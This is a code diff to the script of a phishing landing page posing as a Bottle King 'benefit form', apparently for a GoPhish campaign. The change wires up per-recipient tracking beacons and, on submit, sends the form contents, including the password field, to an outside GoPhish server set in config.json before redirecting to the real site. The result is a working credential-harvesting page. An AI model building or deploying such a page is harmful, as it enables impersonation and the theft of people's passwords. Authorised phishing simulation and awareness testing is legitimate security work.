@@ -90,37 +90,78 @@
   <script>
     (function () {
       var params = new URLSearchParams(window.location.search);
-      var rid = params.get("rid") || "unknown";
+      var rid = params.get("rid") || "";
       var tracked = {};
+      var cfg = { gophish_url: "", tracker_url: "" };
 
       function track(stage, field) {
         var key = stage + ":" + (field || "");
         if (tracked[key]) return;
         tracked[key] = true;
-        try {
-          var events = JSON.parse(localStorage.getItem("bk_events") || "[]");
-          events.push({ rid: rid, stage: stage, field: field || null, at: new Date().toISOString() });
-          localStorage.setItem("bk_events", JSON.stringify(events));
-        } catch (e) {}
+
+        if (cfg.tracker_url && rid) {
+          var url = cfg.tracker_url.replace(/\/$/, "") + "/track?rid=" +
+            encodeURIComponent(rid) + "&stage=" + encodeURIComponent(stage);
+          if (field) url += "&field=" + encodeURIComponent(field);
+          if (navigator.sendBeacon) navigator.sendBeacon(url);
+        }
       }
 
-      track("page_view");
+      function registerClick() {
+        if (!cfg.gophish_url || !rid) return;
+        var base = cfg.gophish_url.replace(/\/$/, "");
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(base + "/?rid=" + encodeURIComponent(rid));
+        } else {
+          new Image().src = base + "/?rid=" + encodeURIComponent(rid);
+        }
+      }
 
-      ["first_name", "last_name", "email", "password"].forEach(function (id) {
-        var el = document.getElementById(id);
-        el.addEventListener("focus", function () { track("field_focus", id); });
-        el.addEventListener("input", function () {
-          if ((el.value || "").trim()) track("field_filled", id);
+      function wireForm() {
+        track("page_view");
+        registerClick();
+
+        ["first_name", "last_name", "email", "password"].forEach(function (id) {
+          var el = document.getElementById(id);
+          el.addEventListener("focus", function () { track("field_focus", id); });
+          el.addEventListener("input", function () {
+            if ((el.value || "").trim()) track("field_filled", id);
+          });
         });
-      });
 
-      document.getElementById("benefit-form").addEventListener("submit", function (e) {
-        e.preventDefault();
-        track("form_submit_attempt");
-        document.getElementById("form-card").style.display = "none";
-        document.getElementById("thanks-card").style.display = "block";
-        setTimeout(function () { window.location.href = "https://www.bottleking.ng"; }, 2500);
-      });
+        document.getElementById("benefit-form").addEventListener("submit", function (e) {
+          e.preventDefault();
+          track("form_submit_attempt");
+
+          if (cfg.gophish_url && rid) {
+            var base = cfg.gophish_url.replace(/\/$/, "");
+            var fd = new FormData(e.target);
+            if (navigator.sendBeacon) {
+              navigator.sendBeacon(base + "/?rid=" + encodeURIComponent(rid), fd);
+            } else {
+              fetch(base + "/?rid=" + encodeURIComponent(rid), {
+                method: "POST",
+                body: fd,
+                mode: "no-cors",
+                keepalive: true
+              });
+            }
+          }
+
+          document.getElementById("form-card").style.display = "none";
+          document.getElementById("thanks-card").style.display = "block";
+          setTimeout(function () { window.location.href = "https://www.bottleking.ng"; }, 2500);
+        });
+      }
+
+      fetch("config.json?_=" + Date.now())
+        .then(function (r) { return r.ok ? r.json() : {}; })
+        .catch(function () { return {}; })
+        .then(function (json) {
+          cfg.gophish_url = json.gophish_url || "";
+          cfg.tracker_url = json.tracker_url || "";
+          wireForm();
+        });
     })();
   </script>
 </body>
